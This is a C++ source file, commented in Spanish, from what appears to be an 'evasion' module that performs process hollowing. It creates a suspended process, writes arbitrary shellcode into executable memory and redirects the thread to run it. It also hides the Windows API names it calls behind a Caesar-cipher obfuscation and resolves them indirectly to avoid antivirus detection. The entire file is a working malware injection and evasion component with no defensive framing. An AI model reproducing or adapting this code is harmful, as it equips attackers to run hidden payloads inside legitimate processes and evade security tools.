#include "evasion/ProcessHollowing.h"
#include "Crypt.h"

// Global vars
pCreateProcessA		CreateProcessA_Indirect;
pWriteProcessMemory WriteProcessMemory_Indirect;
pVirtualProtectEx	VirtualProtectEx_Indirect;
pSetThreadContext	SetThreadContext_Indirect;
pResumeThread		ResumeThread_Indirect;
pVirtualAllocEx		VirtualAllocEx_Indirect;
pReadProcessMemory	ReadProcessMemory_Indirect;
pNtUnmapViewOfSection NtUnmapViewOfSection_Indirect;
pGetThreadContext	GetThreadContext_Indirect;

ProcessHollowing::ProcessHollowing() {
	InitializeIndirectCalls();
}

std::string ProcessHollowing::DecryptFunctionName(std::vector<unsigned char>& encryptedName, unsigned char key) {
	return Crypt::decryptCaesar(encryptedName, key);
}

VOID ProcessHollowing::InitializeIndirectCalls() {
	// Nombres de las DLL cifradas
	std::vector<unsigned char> kernel32 = { 0x49, 0x43, 0x50, 0x4c, 0x43, 0x4a, 0x11, 0x10, 0x0c, 0x42, 0x4a, 0x4a };
	std::vector<unsigned char> ntdll = { 0x4c, 0x52, 0x42, 0x4a, 0x4a, 0x0c, 0x42, 0x4a, 0x4a };

	// Descifrar nombres de las DLL
	std::string kernel32_str = DecryptFunctionName(kernel32, 0xDE);
	std::string ntdll_str = DecryptFunctionName(ntdll, 0xDE);

	// Obtener los manejadores de las DLL
	HMODULE hKernel32 = GetModuleHandleA(kernel32_str.c_str());
	HMODULE hNtDll = GetModuleHandleA(ntdll_str.c_str());

	if (!hKernel32 || !hNtDll) {
		std::cerr << "Error al obtener los manejadores de las DLL" << std::endl;
		throw std::runtime_error("No se pudo cargar kernel32.dll o ntdll.dll");
	}

	// Nombres de las funciones cifradas
	std::vector<unsigned char> CreateProcessA = { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x1f };
	std::vector<unsigned char> WriteProcessMemory = { 0x35, 0x50, 0x47, 0x52, 0x43, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x2b, 0x43, 0x4b, 0x4d, 0x50, 0x57 };
	std::vector<unsigned char> VirtualProtectEx = { 0x34, 0x47, 0x50, 0x52, 0x53, 0x3f, 0x4a, 0x2e, 0x50, 0x4d, 0x52, 0x43, 0x41, 0x52, 0x23, 0x56 };
	std::vector<unsigned char> SetThreadContext = { 0x31, 0x43, 0x52, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42, 0x21, 0x4d, 0x4c, 0x52, 0x43, 0x56, 0x52 };
	std::vector<unsigned char> ResumeThread = { 0x30, 0x43, 0x51, 0x53, 0x4b, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };
	std::vector<unsigned char> VirtualAllocEx = { 0x34, 0x47, 0x50, 0x52, 0x53, 0x3f, 0x4a, 0x1f, 0x4a, 0x4a, 0x4d, 0x41, 0x23, 0x56 };
	std::vector<unsigned char> ReadProcessMemory = { 0x30, 0x43, 0x3f, 0x42, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x2b, 0x43, 0x4b, 0x4d, 0x50, 0x57 };
	std::vector<unsigned char> NtUnmapViewOfSection = { 0x2c, 0x52, 0x33, 0x4c, 0x4b, 0x3f, 0x4e, 0x34, 0x47, 0x43, 0x55, 0x2d, 0x44, 0x31, 0x43, 0x41, 0x52, 0x47, 0x4d, 0x4c };
	std::vector<unsigned char> GetThreadContext = { 0x25, 0x43, 0x52, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42, 0x21, 0x4d, 0x4c, 0x52, 0x43, 0x56, 0x52 };

	// Descifrar los nombres de las funciones
	std::string CreateProcessA_str = DecryptFunctionName(CreateProcessA, 0xDE);
	std::string WriteProcessMemory_str = DecryptFunctionName(WriteProcessMemory, 0xDE);
	std::string VirtualProtectEx_str = DecryptFunctionName(VirtualProtectEx, 0xDE);
	std::string SetThreadContext_str = DecryptFunctionName(SetThreadContext, 0xDE);
	std::string ResumeThread_str = DecryptFunctionName(ResumeThread, 0xDE);
	std::string VirtualAllocEx_str = DecryptFunctionName(VirtualAllocEx, 0xDE);
	std::string ReadProcessMemory_str = DecryptFunctionName(ReadProcessMemory, 0xDE);
	std::string NtUnmapViewOfSection_str = DecryptFunctionName(NtUnmapViewOfSection, 0xDE);
	std::string GetThreadContext_str = DecryptFunctionName(GetThreadContext, 0xDE);

	// Obtener las direcciones de las funciones
	CreateProcessA_Indirect = (pCreateProcessA)GetProcAddress(hKernel32, CreateProcessA_str.c_str());
	WriteProcessMemory_Indirect = (pWriteProcessMemory)GetProcAddress(hKernel32, WriteProcessMemory_str.c_str());
	VirtualProtectEx_Indirect = (pVirtualProtectEx)GetProcAddress(hKernel32, VirtualProtectEx_str.c_str());
	SetThreadContext_Indirect = (pSetThreadContext)GetProcAddress(hKernel32, SetThreadContext_str.c_str());
	ResumeThread_Indirect = (pResumeThread)GetProcAddress(hKernel32, ResumeThread_str.c_str());
	VirtualAllocEx_Indirect = (pVirtualAllocEx)GetProcAddress(hKernel32, VirtualAllocEx_str.c_str());
	ReadProcessMemory_Indirect = (pReadProcessMemory)GetProcAddress(hKernel32, ReadProcessMemory_str.c_str());
	NtUnmapViewOfSection_Indirect = (pNtUnmapViewOfSection)GetProcAddress(hNtDll, NtUnmapViewOfSection_str.c_str());
	GetThreadContext_Indirect = (pGetThreadContext)GetProcAddress(hKernel32, GetThreadContext_str.c_str());

	// Manejo detallado de errores al obtener las funciones
	/*
	if (!CreateProcessA_Indirect) {
		std::cerr << "Error al obtener CreateProcessA" << std::endl;
		throw std::runtime_error("Error al obtener CreateProcessA");
	}
	if (!WriteProcessMemory_Indirect) {
		std::cerr << "Error al obtener WriteProcessMemory" << std::endl;
		throw std::runtime_error("Error al obtener WriteProcessMemory");
	}
	if (!VirtualProtectEx_Indirect) {
		std::cerr << "Error al obtener VirtualProtectEx" << std::endl;
		throw std::runtime_error("Error al obtener VirtualProtectEx");
	}
	if (!SetThreadContext_Indirect) {
		std::cerr << "Error al obtener SetThreadContext" << std::endl;
		throw std::runtime_error("Error al obtener SetThreadContext");
	}
	if (!ResumeThread_Indirect) {
		std::cerr << "Error al obtener ResumeThread" << std::endl;
		throw std::runtime_error("Error al obtener ResumeThread");
	}
	if (!VirtualAllocEx_Indirect) {
		std::cerr << "Error al obtener VirtualAllocEx" << std::endl;
		throw std::runtime_error("Error al obtener VirtualAllocEx");
	}
	if (!ReadProcessMemory_Indirect) {
		std::cerr << "Error al obtener ReadProcessMemory" << std::endl;
		throw std::runtime_error("Error al obtener ReadProcessMemory");
	}
	if (!GetThreadContext_Indirect) {
		std::cerr << "Error al obtener GetThreadContext" << std::endl;
		throw std::runtime_error("Error al obtener GetThreadContext");
	}
	*/
}

PROCESS_INFORMATION ProcessHollowing::CreateSuspendedProcess(const std::string& targetProcess) {
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessA_Indirect(targetProcess.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		std::cerr << "Error al crear el proceso suspendido: " << GetLastError() << std::endl;
		throw std::runtime_error("Error al crear el proceso suspendido");
	}

	return pi;
}

CONTEXT ProcessHollowing::GetProcessContext(HANDLE hThread) {
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext_Indirect(hThread, &ctx)) {
		std::cerr << "Error obteniendo el contexto del hilo: " << GetLastError() << std::endl;
		throw std::runtime_error("Error obteniendo el contexto del hilo");
	}

	return ctx;
}

PVOID ProcessHollowing::WriteShellcodeToProcess(HANDLE hProcess, const std::vector<unsigned char>& shellcode) {
	LPVOID shellcodeAddress = VirtualAllocEx_Indirect(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (shellcodeAddress == NULL) {
		std::cerr << "Error asignando memoria: " << GetLastError() << std::endl;
		throw std::runtime_error("Error asignando memoria");
	}

	// Usar la llamada indirecta a WriteProcessMemory
	if (!WriteProcessMemory_Indirect(hProcess, shellcodeAddress, shellcode.data(), shellcode.size(), NULL)) {
		std::cerr << "Error escribiendo memoria: " << GetLastError() << std::endl;
		throw std::runtime_error("Error escribiendo memoria");
	}

	return shellcodeAddress;
}

VOID ProcessHollowing::SetContextAndResumeProcess(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx, PVOID shellcodeAddress) {
	ctx.Rip = (DWORD64)shellcodeAddress;

	// Usar la llamada indirecta a SetThreadContext
	if (!SetThreadContext_Indirect(hThread, &ctx)) {
		std::cerr << "Error ajustando el contexto del hilo: " << GetLastError() << std::endl;
		throw std::runtime_error("Error ajustando el contexto del hilo");
	}

	// Usar la llamada indirecta a ResumeThread
	ResumeThread_Indirect(hThread);
}

VOID ProcessHollowing::HollowProcess(const std::string& targetProcess, const std::vector<unsigned char>& shellcode) {
	try {
		// 1. Crear el proceso suspendido
		PROCESS_INFORMATION pi = CreateSuspendedProcess(targetProcess);

		// 2. Obtener el contexto del hilo
		CONTEXT ctx = GetProcessContext(pi.hThread);

		// 3. Leer la PEB para obtener la dirección base.
		DWORD64 imageBaseAddress;
		if (!ReadProcessMemory_Indirect(pi.hProcess, (LPCVOID)(ctx.Rdx + 0x10), &imageBaseAddress, sizeof(DWORD64), NULL)) {
			std::cerr << "Error leyendo la memoria del proceso: " << GetLastError() << std::endl;
			throw std::runtime_error("Error leyendo la memoria del proceso");
		}

		std::cout << "Dirección base de la imagen : " << std::hex << imageBaseAddress << std::endl;

		// 4. Cambiar los permisos de memoria a r/x/w.
		DWORD oldProtect;
		if (!VirtualProtectEx(pi.hProcess, (LPVOID)imageBaseAddress, shellcode.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
			std::cerr << "Error cambiando los permisos del proceso: " << GetLastError() << std::endl;
			throw std::runtime_error("Error cambiando los permisos del proceso");
		}

		// 5. Escribir el shellcode en memoria del proceso.
		PVOID shellcodeAddress = WriteShellcodeToProcess(pi.hProcess, shellcode);

		// 6. Modificar el contexto del hilo y reanudar el proceso
		SetContextAndResumeProcess(pi.hProcess, pi.hThread, ctx, shellcodeAddress);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	catch (const std::exception& e) {
		std::cerr << "Error en HollowProcess: " << e.what() << std::endl;
	}
}
